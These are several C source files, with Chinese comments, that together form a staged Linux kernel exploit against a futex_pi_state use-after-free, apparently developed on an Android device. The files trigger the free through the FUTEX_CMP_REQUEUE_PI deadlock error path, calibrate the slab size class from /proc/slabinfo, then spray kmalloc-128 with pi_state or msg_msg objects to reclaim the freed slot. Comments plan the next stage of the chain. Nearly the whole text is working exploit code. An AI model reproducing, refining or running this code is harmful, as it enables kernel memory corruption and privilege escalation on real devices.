struct shared {
	uint32_t A, A2, B, C;
	volatile int w_holds_b;
	volatile int o_holds_c, o_blocked_b;
	volatile int w_waiting, w_ret, w_err, w_returned;
	volatile int w2_waiting;
	struct pair spray[MSPRAY];
	volatile int done;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap;
	int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.1fms] %s\n", now_ms() - t0, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	while (ts->tv_nsec >= 1000000000L) {
		ts->tv_sec += 1;
		ts->tv_nsec -= 1000000000L;
	}
}

static long futex(uint32_t *u, int op, uint32_t val, void *to,
		  uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) {
		if (*p) return 1;
		usleep(2000);
	}
	return *p;
}

static void pin_cpu0(void)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		lg("sched_setaffinity 失败 errno=%d", errno);
}

/* ---- W：持 B，带超时等 A→C ---- */
static void *th_w(void *arg)
{
	struct timespec ts;
	long r;
	(void)arg;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno); return NULL;
	}
	S->w_holds_b = 1;
	abs_timeout(&ts, 600);
	while (!S->o_blocked_b)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	S->w_ret = (int)r; S->w_err = errno; S->w_returned = 1;
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---- O：持 C，阻塞于 B ---- */
static void *th_o(void *arg)
{
	(void)arg;
	if (futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno); return NULL;
	}
	S->o_holds_c = 1;
	while (!S->w_holds_b)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked_b = 1;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0)
		lg("O: LOCK_PI(B) 失败 errno=%d", errno);
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---- W2：等 A2→C（走查触发者） ---- */
static void *th_w2(void *arg)
{
	struct timespec ts;
	long r;
	(void)arg;
	abs_timeout(&ts, 4000);
	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	lg("W2: WAIT_REQUEUE_PI(A2→C) 返回 %ld errno=%d", r, errno);
	return NULL;
}

/* ---- 喷堆：holder 抢到锁，waiter 阻塞 ⇒ 分配 1 个 pi_state ---- */
static void *th_spray_hold(void *arg)
{
	struct pair *p = arg;
	if (futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		p->held = -1; return NULL;
	}
	p->held = 1;
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_spray_wait(void *arg)
{
	struct pair *p = arg;
	struct timespec ts;
	while (p->held == 0 && !S->done)
		__asm__ __volatile__("" ::: "memory");
	p->waiter_in = 1;
	abs_timeout(&ts, 6000);
	(void)futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2, sh[MSPRAY], sw[MSPRAY];
	long r;
	int e, i, sprayed = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	t0 = now_ms();
	lg("===== G3D-D2 start pid=%d =====", getpid());
	pin_cpu0();

	S = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 8192);

	/* [1] 建环 */
	pthread_create(&tw, NULL, th_w, NULL);
	pthread_create(&to, NULL, th_o, NULL);
	if (!wait_flag(&S->w_holds_b, 3000) || !wait_flag(&S->o_blocked_b, 3000) ||
	    !wait_flag(&S->w_waiting, 3000)) {
		lg("建环握手失败"); S->done = 1; _exit(2);
	}
	usleep(100000);

	/* [2] 触发 -EDEADLK：写 waiter->lock=C，并释放 C 的 pi_state */
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[2] CMP_REQUEUE_PI(A→C,1) → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) { lg("[2] 未命中，终止"); S->done = 1; _exit(3); }

	/* [3] 等 W 超时早退 ⇒ 帧死亡，留下悬垂指针 */
	if (!wait_flag(&S->w_returned, 4000)) {
		lg("[3] W 未返回，终止"); S->done = 1; _exit(4);
	}
	lg("[3] W 返回 %d errno=%d → 悬垂指针留存（lock=旧 C 地址）", S->w_ret, S->w_err);
	lg("[3] C 字值=%u (O.tid 假象) ; 内核 owner 已被 proxy_unlock", S->C);

	/* [4] 同 cache 喷堆（pi_state 88B → kmalloc-128） */
	for (i = 0; i < MSPRAY; i++) {
		if (pthread_create(&sh[i], NULL, th_spray_hold, &S->spray[i]) != 0) break;
		if (pthread_create(&sw[i], NULL, th_spray_wait, &S->spray[i]) != 0) break;
		sprayed++;
	}
	{
		int spin = 0;
		while (spin < 300) {
			int c = 0;
			for (i = 0; i < sprayed; i++)
				if (S->spray[i].held == 1 && S->spray[i].waiter_in) c++;
			if (c == sprayed) break;
			usleep(3000);
			spin++;
		}
	}
	usleep(150000);
	lg("[4] 已喷 %d 组竞争 PI futex（每组 1 个 pi_state，同 cache）", sprayed);

	/* [5] 走查判定 */
	pthread_create(&tw2, NULL, th_w2, NULL);
	if (!wait_flag(&S->w2_waiting, 3000)) {
		lg("[5] W2 未进入等待，终止"); S->done = 1; _exit(5);
	}
	usleep(100000);
	lg("[5] CMP_REQUEUE_PI(A2→C,1)：链条 C→O→B(owner W)→W→槽(lock=旧C)");
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[5] → %ld errno=%d (%s)", r, e, strerror(e));
	if (r >= 0)
		lg("verdict: **回收成功** —— 旧 C 地址已被新 pi_state 占用，走查安全落地（返回 %ld）", r);
	else
		lg("verdict: 返回错误（errno=%d），可能仍未回收但未崩溃", e);
	lg("结束");
	S->done = 1;
	_exit(0);
}
```

`tools/g3d_d2b.c`:

```c
/*
 * g3d_d2b.c — futex_pi_state UAF · D2''：同 cache 回收（修正 LOCK_PI 超时语义 + 亚毫秒窗口）
 *
 * 相对 d2 的三处关键修正（§21.21/§21.22）：
 *   1) 喷堆 waiter 改用 LOCK_PI(word, NULL)：本机 FUTEX_LOCK_PI 若传 monotonic 绝对时刻会
 *      **立即 ETIMEDOUT**（实测 0.0ms），导致"喷堆"微秒级就把 pi_state 释放掉 ⇒ d2 实际没占住任何对象。
 *   2) 喷堆 waiter 用 futex 门控（FUTEX_WAIT/WAKE），不空转抢 CPU；main 唤醒后只等 ~2ms。
 *   3) 全部线程绑 CPU0：kfree 发生在 main 的 futex_requeue 里，分配也要在同一 CPU 的 cpu-slab 上。
 *
 * 窗口：kfree(t≈[2]) → 走查(t≈[2]+2ms)，比 d2 的 1.1s 小三个数量级。
 * 判据（§21.23）：[5] 返回 0/1 且设备存活 = 回收成功；不返回/重启 = 未命中。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define LOGPATH "/data/local/tmp/g3d_d2b.log"
#define FUTEX_WAIT            0
#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG  128
#define MSPRAY 48

static int logfd = -1;
static double t0;

struct pair { uint32_t word; volatile int held; };

struct shared {
	uint32_t A, A2, B, C;
	uint32_t go;                        /* 喷堆门控 futex */
	volatile int w_holds_b, o_holds_c, o_blocked_b;
	volatile int w_waiting, w_ret, w_err, w_returned;
	volatile int w2_waiting, w2_ret, w2_err;
	struct pair spray[MSPRAY];
	volatile int go_spray;
	volatile int done;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap; int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.2fms] %s\n", now_ms() - t0, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	while (ts->tv_nsec >= 1000000000L) { ts->tv_sec += 1; ts->tv_nsec -= 1000000000L; }
}

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3)
{
	return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) { if (*p) return 1; usleep(2000); }
	return *p;
}

static void pin_cpu0(void)
{
	cpu_set_t set;
	CPU_ZERO(&set); CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		lg("sched_setaffinity 失败 errno=%d", errno);
}

static void *th_w(void *arg)
{
	struct timespec ts; long r;
	(void)arg;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno); return NULL;
	}
	S->w_holds_b = 1;
	abs_timeout(&ts, 3000);             /* 放宽：实验期间不要醒 */
	while (!S->o_blocked_b) __asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	S->w_ret = (int)r; S->w_err = errno; S->w_returned = 1;
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_o(void *arg)
{
	(void)arg;
	if (futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno); return NULL;
	}
	S->o_holds_c = 1;
	while (!S->w_holds_b) __asm__ __volatile__("" ::: "memory");
	S->o_blocked_b = 1;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0)
		lg("O: LOCK_PI(B) 失败 errno=%d", errno);
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_w2(void *arg)
{
	struct timespec ts; long r;
	(void)arg;
	abs_timeout(&ts, 4000);
	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	S->w2_ret = (int)r; S->w2_err = errno;
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_spray_hold(void *arg)
{
	struct pair *p = arg;
	if (futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		p->held = -1; return NULL;
	}
	p->held = 1;
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* 关键：NULL 超时 ⇒ 永久阻塞 ⇒ pi_state 存活到进程退出 */
static void *th_spray_wait(void *arg)
{
	struct pair *p = arg;
	/* futex 门控睡眠（go 既是字值又是等待地址，避免丢唤醒） */
	while (!S->done) {
		if (S->go) break;
		(void)futex(&S->go, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	}
	if (S->done) return NULL;
	(void)futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t tw, to, tw2, sh[MSPRAY], sw[MSPRAY];
	int mode_trylock = (argc > 1 && argv[1][0] == 't');
	int mode_msgsnd  = (argc > 1 && argv[1][0] == 'm');
	long r, r5; int e, e5, i, held = 0;
	double t_free, t_walk;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	t0 = now_ms();
	lg("===== G3D-D2'' start pid=%d mode=%s =====", getpid(), mode_trylock ? "trylock-probe" : (mode_msgsnd ? "msg-spray" : "spray"));
	pin_cpu0();

	S = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 8192);

	/* [1] 建环 + 预置喷堆线程 */
	pthread_create(&tw, NULL, th_w, NULL);
	pthread_create(&to, NULL, th_o, NULL);
	pthread_create(&tw2, NULL, th_w2, NULL);
	for (i = 0; i < MSPRAY; i++) {
		pthread_create(&sh[i], NULL, th_spray_hold, &S->spray[i]);
		pthread_create(&sw[i], NULL, th_spray_wait, &S->spray[i]);
	}
	if (!wait_flag(&S->w_holds_b, 3000) || !wait_flag(&S->o_blocked_b, 3000) ||
	    !wait_flag(&S->w_waiting, 3000) || !wait_flag(&S->w2_waiting, 3000)) {
		lg("握手失败"); S->done = 1; _exit(2);
	}
	{	int spin = 0;
		while (spin < 400) {
			held = 0;
			for (i = 0; i < MSPRAY; i++) if (S->spray[i].held == 1) held++;
			if (held == MSPRAY) break;
			usleep(2000); spin++;
		}
	}
	usleep(100000);
	lg("[1] 环就绪；喷堆 holder 已持锁 %d/%d（waiter 停在 futex 门控上）", held, MSPRAY);

	/* [2] 触发 -EDEADLK：写 waiter->lock=C 并（在本进程内）释放 C 的 pi_state */
	lg("[2] 发 CMP_REQUEUE_PI(A→C,1)  —— 之后立即放行喷堆，中间不写日志");
	errno = 0;
	t_free = now_ms();
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	if (!(r == -1 && e == EDEADLK)) {
		lg("[2] 未命中 r=%ld errno=%d (%s)", r, e, strerror(e));
		S->done = 1; _exit(3);
	}

	if (mode_trylock) {
		/* 零风险直读探针：TRYLOCK_PI(C)。0=内核 owner 为空（pi_state 已释放）；
		 * -EAGAIN=owner 仍是 O（pi_state 未被释放）。 */
		long tr; int te;
		errno = 0;
		tr = futex(&S->C, 8 /* FUTEX_TRYLOCK_PI */ | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
		te = errno;
		lg("[T] FUTEX_TRYLOCK_PI(C) → %ld errno=%d (%s)", tr, te, strerror(te));
		lg(tr == 0 ? "[T] verdict: C 的**内核 owner 为空** ⇒ [2] 的 -EDEADLK 确实 proxy_unlock 并释放了 pi_state"
			   : (te == EAGAIN ? "[T] verdict: C 仍被持有（owner=O）⇒ pi_state **未被释放**，§21.11/§21.15 的机制需重判"
					   : "[T] verdict: 其他"));
		if (tr == 0) { (void)futex(&S->C, 7 /* UNLOCK_PI */ | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0); }
		lg("[T] C 字值=%u", S->C);
		S->done = 1; _exit(0);
	}

	/* [3m] 质量喷堆：SysV msg_msg（48B 头 + 80B 载荷 = 128B ⇒ kmalloc-128）
	 *      m_type = 0x100000000（低 32 位为 0）⇒ 命中时 wait_lock=0 放行、
	 *      waiters=m_ts=80 ⇒ 走到 rt_mutex_top_waiter/owner 即 oops（panic 自动重启，不卡死） */
	if (mode_msgsnd) {
		struct { long mtype; char mtext[80]; } mb;
		int q[10], i2, sent = 0, nq = 10, per = 200;
		mb.mtype = 0x100000000L;
		memset(mb.mtext, 0x41, sizeof(mb.mtext));
		for (i2 = 0; i2 < nq; i2++) q[i2] = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
		for (i2 = 0; i2 < nq * per; i2++) {
			if (q[i2 / per] < 0) continue;
			if (msgsnd(q[i2 / per], &mb, sizeof(mb.mtext), IPC_NOWAIT) == 0) sent++;
		}
		t_walk = now_ms();
		errno = 0;
		r5 = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
		e5 = errno;
		lg("[2] CMP_REQUEUE_PI(A→C)  → %ld errno=%d (%s)", r, e, strerror(e));
		lg("[3m] msgsnd 成功 %d 条（目标 2000）；free→walk 间隔 = %.3f ms", sent, t_walk - t_free);
		lg("[5] CMP_REQUEUE_PI(A2→C) → %ld errno=%d (%s)", r5, e5, strerror(e5));
		lg(r5 == -1 && e5 == EDEADLK
		   ? "verdict: 仍 -EDEADLK ⇒ 2000 次同 cache 分配都没拿到 ⇒ **对象没有被释放**"
		   : "verdict: 结果与 -EDEADLK 不同 ⇒ 槽被 msg_msg 占住 ⇒ **对象曾被释放**（详见返回码）");
		for (i2 = 0; i2 < nq; i2++) if (q[i2] >= 0) msgctl(q[i2], IPC_RMID, NULL);
		lg("结束");
		S->done = 1; _exit(0);
	}

	/* [3] 放行喷堆 → 等 2ms → 立即走查（此段禁止任何日志/syscall 分配） */
	S->go = 1;
	(void)futex(&S->go, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 0x7fffffff, NULL, NULL, 0);
	usleep(8000);
	t_walk = now_ms();
	errno = 0;
	r5 = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e5 = errno;

	/* [4] 事后记录 */
	lg("[2] CMP_REQUEUE_PI(A→C)  → %ld errno=%d (%s)", r, e, strerror(e));
	lg("[3] free→walk 间隔 = %.3f ms", t_walk - t_free);
	lg("[5] CMP_REQUEUE_PI(A2→C) → %ld errno=%d (%s)", r5, e5, strerror(e5));
	if (r5 >= 0) {
		lg("verdict: **回收成功** —— 旧 C 地址已被喷堆 pi_state 占住，走查安全落地（r=%ld）", r5);
		lg("        ⇒ UAF 可控复填成立；下一步 D3：让喷堆 holder 阻塞在我的锁上，延续链条");
	} else {
		lg("verdict: 返回错误 errno=%d，未回收但未崩溃（按 §21.23 转备选①）", e5);
	}
	S->done = 1;
	_exit(0);
}
```

`tools/g3d_lpito.c`:

```c
/* g3d_lpito.c — 零风险：核对本机 FUTEX_LOCK_PI 的超时语义（绝对 vs 相对 / 是否提前返回） */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define F_LOCK_PI 6
#define F_UNLOCK_PI 7
#define F_PRIV 128

static uint32_t *W;
static volatile int hold_done;
static double now_ms(void){struct timespec t;clock_gettime(CLOCK_MONOTONIC,&t);return t.tv_sec*1000.0+t.tv_nsec/1e6;}

static long lock_pi_abs(uint32_t *u, int ms)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += ms / 1000;
	ts.tv_nsec += (long)(ms % 1000) * 1000000L;
	while (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
	return syscall(SYS_futex, u, F_LOCK_PI | F_PRIV, 0, &ts, NULL, 0);
}

static void *holder(void *a)
{
	(void)a;
	long r = syscall(SYS_futex, &W[0], F_LOCK_PI | F_PRIV, 0, NULL, NULL, 0);
	printf("holder LOCK_PI(F0) r=%ld errno=%d\n", r, errno);
	hold_done = 1;
	usleep(3000000);                    /* 持锁 3s */
	syscall(SYS_futex, &W[0], F_UNLOCK_PI | F_PRIV, 0, NULL, NULL, 0);
	printf("holder UNLOCK_PI(F0)\n");
	return NULL;
}

static void *waiter(void *a)
{
	(void)a;
	double t = now_ms();
	long r;
	errno = 0;
	r = lock_pi_abs(&W[0], 5000);       /* 绝对 5s；若实现正确应阻塞 ~3s 后成功 */
	printf("waiter LOCK_PI(F0, abs +5s) r=%ld errno=%d 耗时=%.1fms\n", r, errno, now_ms() - t);
	if (r == 0) syscall(SYS_futex, &W[0], F_UNLOCK_PI | F_PRIV, 0, NULL, NULL, 0);
	return NULL;
}

int main(void)
{
	pthread_t h, w;
	long r; int e; double t;
	W = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	/* case1: 持锁 3s，waiter 用 abs+5s 等 ⇒ 预期 ~3000ms 成功 */
	pthread_create(&h, NULL, holder, NULL);
	while (!hold_done) usleep(1000);
	pthread_create(&w, NULL, waiter, NULL);
	pthread_join(w, NULL);
	pthread_join(h, NULL);

	/* case2: 无人释放，waiter 用 abs+300ms ⇒ 预期 ~300ms 超时 */
	t = now_ms(); errno = 0;
	r = lock_pi_abs(&W[1], 300);
	e = errno;
	printf("case2 LOCK_PI(F1, abs +300ms) r=%ld errno=%d (%s) 耗时=%.1fms\n",
	       r, e, strerror(e), now_ms() - t);

	/* case3: 无人释放，NULL 超时 —— 只测 200ms 内是否返回（预期不返回） */
	printf("case3 略（NULL 超时会永久阻塞，不测）\n");
	return 0;
}
```

`tools/g3d_piufa.c`:

```c
/*
 * g3d_piufa.c — futex_pi_state UAF 线 · D1：尺寸类标定（安全，无悬挂状态）
 *
 * 背景（交接文档 §21.17）：
 *   `CMP_REQUEUE_PI` 返回 -EDEADLK 时，错误路径 put_pi_state() 归零
 *   ⇒ free_pi_state() ⇒ rt_mutex_proxy_unlock() + kfree()，销毁目标 futex 的
 *   pi_state（内核 owner 变 NULL，用户态字值不变）。悬垂 waiter->lock 指向
 *   这块已释放对象 ⇒ 堆 UAF。
 *
 * D1 目标（本程序）：
 *   1) 标定 `struct futex_pi_state` 的真实尺寸类：制造 N 个**有竞争**的 PI futex
 *      （每对 = 持有者 + 一个阻塞 waiter），每对必分配 1 个 pi_state；
 *      对比 /proc/slabinfo 的 kmalloc-64/96/128 active_objs 前后差值。
 *   2) 回收后再测一次，确认差值回落（验证测量方法本身有效）。
 *   3) 留出 `u` 模式给 D2/D3 复用（本版不启用）。
 *
 * 判据：若 kmalloc-96 的 active 增加量 ≈ N，则 pi_state 尺寸类为 kmalloc-96
 *       （88 B → 96 的 slab），D2 的喷堆目标即该类。
 *
 * 用法（设备端）：
 *   /data/local/tmp/g3d_piufa s [N]     # 默认 N=32
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3d.log"
#define FUTEX_LOCK_PI       6
#define FUTEX_UNLOCK_PI     7
#define FUTEX_PRIVATE_FLAG  128
#define MAXN                128

static int logfd = -1;
static double t0;

struct pair {
	uint32_t word;
	volatile int held;
	volatile int waiter_in;
	volatile int go_release;
	volatile int waiter_done;
};

static struct pair *P;
static int N = 32;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap;
	int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.1fms] %s\n", now_ms() - t0, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static long lock_pi_to(uint32_t *u, int ms)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += ms / 1000;
	ts.tv_nsec += (long)(ms % 1000) * 1000000L;
	while (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
	return syscall(SYS_futex, u, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
}

static long unlock_pi(uint32_t *u)
{
	return syscall(SYS_futex, u, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

/* 读 /proc/slabinfo 中某个 cache 的 active_objs */
static long slab_active(const char *name, long *num_objs, long *objsize)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char line[512], nm[64];
	long act, num, osz, ops, pps;
	if (!f) return -1;
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "%63s %ld %ld %ld %ld %ld", nm, &act, &num,
			   &osz, &ops, &pps) == 6) {
			if (strcmp(nm, name) == 0) {
				fclose(f);
				if (num_objs) *num_objs = num;
				if (objsize) *objsize = osz;
				return act;
			}
		}
	}
	fclose(f);
	return -1;
}

static void snap(const char *tag)
{
	const char *caches[] = { "kmalloc-64", "kmalloc-96", "kmalloc-128" };
	int i;
	for (i = 0; i < 3; i++) {
		long num = 0, osz = 0;
		long act = slab_active(caches[i], &num, &osz);
		if (act < 0)
			lg("slab %-12s : <不可读>  [%s]", caches[i], tag);
		else
			lg("slab %-12s : active=%-7ld num=%-7ld objsize=%ld  [%s]",
			   caches[i], act, num, osz, tag);
	}
}

static void *th_hold(void *arg)
{
	struct pair *p = arg;
	if (lock_pi_to(&p->word, 5000) != 0) {
		lg("hold: LOCK_PI 失败 errno=%d", errno);
		p->held = -1;
		return NULL;
	}
	p->held = 1;
	while (!p->go_release)
		__asm__ __volatile__("" ::: "memory");
	(void)unlock_pi(&p->word);
	return NULL;
}

static void *th_wait(void *arg)
{
	struct pair *p = arg;
	while (p->held == 0)
		__asm__ __volatile__("" ::: "memory");
	p->waiter_in = 1;
	/* 阻塞：触发该 futex 的 pi_state 分配 */
	if (lock_pi_to(&p->word, 5000) != 0) {
		lg("wait: LOCK_PI 返回 errno=%d（预期交接成功）", errno);
		p->waiter_done = -1;
		return NULL;
	}
	/* 交接后成为 owner，释放并退出 */
	(void)unlock_pi(&p->word);
	p->waiter_done = 1;
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t *th = NULL, *tw = NULL;
	int i, ok = 0;
	char mode = (argc > 1) ? argv[1][0] : 's';

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	t0 = now_ms();
	if (argc > 2) {
		N = atoi(argv[2]);
		if (N < 1) N = 1;
		if (N > MAXN) N = MAXN;
	}
	lg("===== G3D D1 start pid=%d mode=%c N=%d =====", getpid(), mode, N);

	P = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (P == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(P, 0, 4096);

	th = calloc(N, sizeof(pthread_t));
	tw = calloc(N, sizeof(pthread_t));

	snap("baseline");

	for (i = 0; i < N; i++) {
		if (pthread_create(&th[i], NULL, th_hold, &P[i]) != 0 ||
		    pthread_create(&tw[i], NULL, th_wait, &P[i]) != 0) {
			lg("线程创建失败 i=%d", i);
			break;
		}
	}
	/* 等待全部就绪（持有 + waiter 已排队） */
	{
		int spin = 0;
		while (spin < 400) {
			int c = 0;
			for (i = 0; i < N; i++)
				if (P[i].held == 1 && P[i].waiter_in) c++;
			if (c == N) break;
			usleep(5000);
			spin++;
		}
		for (i = 0; i < N; i++)
			if (P[i].held == 1 && P[i].waiter_in) ok++;
	}
	usleep(150000);
	lg("已建立 %d/%d 个竞争 PI futex（每个应分配 1 个 futex_pi_state）", ok, N);
	snap("after-alloc");

	/* 回收 */
	for (i = 0; i < N; i++)
		P[i].go_release = 1;
	for (i = 0; i < N; i++) {
		pthread_join(th[i], NULL);
		pthread_join(tw[i], NULL);
	}
	usleep(200000);
	lg("已回收全部竞争 futex");
	snap("after-free");

	lg("---- 判读 ----");
	lg("若 after-alloc 相对 baseline 在 kmalloc-96 上增加 ≈ %d，且 after-free 回落，", N);
	lg("则 futex_pi_state 的尺寸类 = kmalloc-96（88 B → 96），D2 喷堆目标即该类。");
	lg("结束");
	if (logfd >= 0) fsync(logfd);
	return 0;
}
```
